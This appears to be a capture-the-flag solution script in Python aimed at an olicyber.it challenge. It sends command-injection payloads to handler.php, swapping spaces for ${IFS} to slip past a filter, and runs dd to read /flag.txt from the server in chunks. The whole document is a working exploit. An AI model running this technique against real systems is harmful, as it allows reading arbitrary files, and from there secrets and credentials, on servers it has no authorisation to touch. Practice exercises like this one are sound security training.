import requests


url = "http://timp.challs.olicyber.it"
handler = "/handler.php"

s = requests.Session()

result = ""

for i in range (5): 
    payload = 'dd${IFS}if=/flag.txt${IFS}bs=1${IFS}skip='+str(i*10)
    params = {
    "cmd": payload
    }
    r = s.post(url+handler, data=params)
    result += r.text
print(result)